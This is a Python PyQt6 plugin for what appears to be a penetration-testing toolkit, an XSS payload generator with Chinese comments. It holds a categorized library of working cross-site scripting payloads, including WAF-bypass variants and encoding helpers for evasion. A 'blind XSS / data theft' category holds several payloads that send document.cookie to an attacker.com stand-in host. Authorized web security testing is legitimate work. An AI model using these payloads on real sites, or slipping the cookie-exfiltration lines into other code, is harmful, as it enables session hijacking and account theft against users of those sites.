"""
XSS Payload 生成器 — 上下文感知的跨站脚本 Payload 生成。

特性:
  - 多种注入上下文: HTML标签内 / 属性值 / JavaScript / URL
  - 预置 Payload 库 (按场景分类)
  - WAF 绕过变体
  - 一键复制
  - 编码转换 (HTML Entity / URL / Unicode)
"""

from __future__ import annotations

import html
import urllib.parse
from typing import Any, Optional

from PyQt6.QtCore import Qt, pyqtSignal
from PyQt6.QtWidgets import (
    QComboBox,
    QGroupBox,
    QHBoxLayout,
    QLabel,
    QListWidget,
    QListWidgetItem,
    QPushButton,
    QSplitter,
    QTabWidget,
    QTextEdit,
    QVBoxLayout,
    QWidget,
)

from core.tool_base import BaseTool, ToolCategory, ToolMeta
from core.tool_registry import register_tool

# XSS Payload 库
XSS_PAYLOADS = {
    "基础测试": [
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
    ],
    "属性注入": [
        "\" onmouseover=alert(1) x=\"",
        "' onmouseover=alert(1) x='",
        "\" autofocus onfocus=alert(1) x=\"",
        "javascript:alert(1)",
        "\" onclick=alert(1) x=\"",
        "\" onerror=alert(1) x=\"",
        "` onmouseover=alert(1)",
        "1 onmouseover=alert(1)",
        "\"><script>alert(1)</script>",
        "\"></script><script>alert(1)</script>",
    ],
    "JavaScript 上下文": [
        "</script><script>alert(1)</script>",
        "\"-alert(1)-\"",
        "';alert(1)//",
        "\";alert(1)//",
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
        "eval(atob('YWxlcnQoMSk='))",
        "setTimeout('alert(1)')",
        "Function('alert(1)')()",
    ],
    "URL 上下文": [
        "javascript:alert(1)",
        "javascript:alert(document.cookie)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "vbscript:msgbox(1)",
    ],
    "WAF 绕过": [
        "<ScRiPt>alert(1)</sCrIpT>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img src=x onerror=&#97;lert(1)>",
        "<svg/onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<!--><script>alert(1)</script>-->",
        "<script>/*%%0D*/alert(1)</script>",
    ],
    "HTML5 向量": [
        "<details open ontoggle=alert(1)>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        "<form><button formaction=javascript:alert(1)>click",
        "<meter onmouseover=alert(1)>",
        "<progress onmouseover=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<video><source onerror=alert(1)>",
    ],
    "盲 XSS / 数据窃取": [
        "<script>new Image().src='https://attacker.com/log?c='+document.cookie</script>",
        "<script>fetch('https://attacker.com/log?c='+document.cookie)</script>",
        "<svg onload=fetch('https://attacker.com/log?c='+document.cookie)>",
        "<script>navigator.sendBeacon('https://attacker.com/log',document.cookie)</script>",
    ],
}


class XssGenWidget(QWidget):
    """XSS Payload 生成器 UI"""

    execute_requested = pyqtSignal(dict)

    def __init__(self, parent: Optional[QWidget] = None) -> None:
        super().__init__(parent)
        self._init_ui()

    def _init_ui(self) -> None:
        layout = QVBoxLayout(self)
        layout.setContentsMargins(16, 16, 16, 16)
        layout.setSpacing(12)

        # ---- 上下文选择 ----
        ctx_group = QGroupBox("注入上下文")
        ctx_group.setStyleSheet(_group_style())
        cl = QHBoxLayout(ctx_group)
        cl.addWidget(QLabel("上下文:"))
        self._ctx_combo = QComboBox()
        self._ctx_combo.addItems([
            "HTML 标签内", "HTML 属性值(双引号)", "HTML 属性值(单引号)",
            "JavaScript 字符串", "URL/href", "CSS", "自定义",
        ])
        self._ctx_combo.setStyleSheet(_combo_style())
        self._ctx_combo.currentTextChanged.connect(self._on_context_change)
        cl.addWidget(self._ctx_combo, stretch=1)
        layout.addWidget(ctx_group)

        # ---- 主区域 ----
        splitter = QSplitter(Qt.Orientation.Horizontal)

        # Payload 库
        lib_panel = QWidget()
        ll = QVBoxLayout(lib_panel)
        ll.setContentsMargins(0, 0, 0, 0)

        self._cat_tabs = QTabWidget()
        self._cat_tabs.setStyleSheet(_tab_style())
        self._payload_lists: dict[str, QListWidget] = {}

        for cat, payloads in XSS_PAYLOADS.items():
            lst = QListWidget()
            lst.setStyleSheet("""
                QListWidget { background-color: #11111b; color: #cdd6f4;
                    border: none; font-family: Consolas, monospace; font-size: 11px; }
                QListWidget::item { padding: 6px 8px; }
                QListWidget::item:hover { background-color: #313244; }
                QListWidget::item:selected { background-color: #45475a; }
            """)
            for p in payloads:
                lst.addItem(p)
            lst.itemClicked.connect(self._on_payload_selected)
            self._payload_lists[cat] = lst
            self._cat_tabs.addTab(lst, cat)

        ll.addWidget(self._cat_tabs)
        splitter.addWidget(lib_panel)

        # 生成/编码区
        right_panel = QWidget()
        rl = QVBoxLayout(right_panel)
        rl.setContentsMargins(8, 0, 0, 0)

        rl.addWidget(QLabel("选中的 Payload:"))
        self._payload_edit = QTextEdit()
        self._payload_edit.setMaximumHeight(60)
        self._payload_edit.setStyleSheet(_textarea_style())
        rl.addWidget(self._payload_edit)

        # 编码操作
        enc_group = QGroupBox("编码转换")
        enc_group.setStyleSheet(_group_style())
        el = QHBoxLayout(enc_group)
        for label, fn_name in [
            ("HTML Entity", "html_entity"),
            ("URL Encode", "url_encode"),
            ("Unicode \\u", "unicode_escape"),
            ("Base64", "base64"),
            ("双重 URL", "double_url"),
        ]:
            btn = QPushButton(label)
            btn.setStyleSheet(_btn_small_style())
            btn.clicked.connect(lambda checked, n=fn_name: self._encode(n))
            el.addWidget(btn)
        rl.addWidget(enc_group)

        rl.addWidget(QLabel("编码结果:"))
        self._output_edit = QTextEdit()
        self._output_edit.setReadOnly(True)
        self._output_edit.setStyleSheet(_textarea_style())
        rl.addWidget(self._output_edit, stretch=1)

        # 复制按钮
        btn_row = QHBoxLayout()
        copy_btn = QPushButton("📋 复制结果")
        copy_btn.setStyleSheet(_btn_primary_style())
        copy_btn.clicked.connect(self._copy_output)
        btn_row.addWidget(copy_btn)
        btn_row.addStretch()
        rl.addLayout(btn_row)

        splitter.addWidget(right_panel)
        splitter.setSizes([400, 500])
        layout.addWidget(splitter, stretch=1)

    def _on_payload_selected(self, item: QListWidgetItem) -> None:
        self._payload_edit.setPlainText(item.text())

    def _on_context_change(self, ctx: str) -> None:
        self._payload_edit.setPlaceholderText(f"输入 {ctx} 的 XSS Payload...")

    def _encode(self, mode: str) -> None:
        text = self._payload_edit.toPlainText().strip()
        if not text:
            return
        import base64
        result = text
        if mode == "html_entity":
            result = html.escape(text)
        elif mode == "url_encode":
            result = urllib.parse.quote(text)
        elif mode == "unicode_escape":
            result = "".join(f"\\u{ord(c):04x}" for c in text)
        elif mode == "base64":
            result = base64.b64encode(text.encode()).decode()
        elif mode == "double_url":
            result = urllib.parse.quote(urllib.parse.quote(text))
        self._output_edit.setPlainText(result)

    def _copy_output(self) -> None:
        from PyQt6.QtWidgets import QApplication
        text = self._output_edit.toPlainText() or self._payload_edit.toPlainText()
        QApplication.clipboard().setText(text)


@register_tool
class XssGeneratorTool(BaseTool):
    """XSS 生成器"""

    meta = ToolMeta(
        name="xss_generator",
        display_name="XSS Payload 生成器",
        category=ToolCategory.WEB_TESTING,
        description="上下文感知的 XSS Payload 库，支持编码转换和 WAF 绕过",
        icon="💉",
        version="1.0.0",
        keywords=["xss", "payload", "跨站脚本", "注入", "waf", "绕过"],
    )

    def __init__(self) -> None:
        super().__init__()
        self._widget: Optional[XssGenWidget] = None

    def create_widget(self) -> QWidget:
        self._widget = XssGenWidget()
        return self._widget

    def execute(self, params: dict[str, Any]) -> str:
        return ""

    def validate_params(self, params: dict[str, Any]) -> list[str]:
        return []


# ---- 样式 ----
def _group_style() -> str:
    return """QGroupBox { color: #cdd6f4; font-size: 14px; font-weight: bold;
        border: 1px solid #313244; border-radius: 8px;
        margin-top: 8px; padding-top: 20px; }
        QGroupBox::title { subcontrol-origin: margin; left: 16px; padding: 0 8px; }"""


def _combo_style() -> str:
    return """QComboBox { background-color: #313244; color: #cdd6f4;
        border: 1px solid #45475a; border-radius: 6px;
        padding: 8px 12px; font-size: 13px; }"""


def _textarea_style() -> str:
    return """QTextEdit { background-color: #11111b; color: #cdd6f4;
        border: 1px solid #313244; border-radius: 6px;
        padding: 8px; font-family: Consolas, monospace; font-size: 12px; }"""


def _btn_primary_style() -> str:
    return """QPushButton { background-color: #f38ba8; color: #1e1e2e;
        border: none; border-radius: 6px;
        padding: 8px 16px; font-size: 12px; font-weight: bold; }
        QPushButton:hover { background-color: #eba0ac; }"""


def _btn_small_style() -> str:
    return """QPushButton { background-color: #45475a; color: #cdd6f4;
        border: none; border-radius: 4px;
        padding: 3px 10px; font-size: 11px; }
        QPushButton:hover { background-color: #585b70; }"""


def _tab_style() -> str:
    return """QTabWidget::pane { border: 1px solid #313244; background-color: #1e1e2e; }
        QTabBar::tab { background-color: #181825; color: #a6adc8;
        padding: 4px 12px; font-size: 11px; }
        QTabBar::tab:selected { background-color: #1e1e2e; color: #cdd6f4; }"""
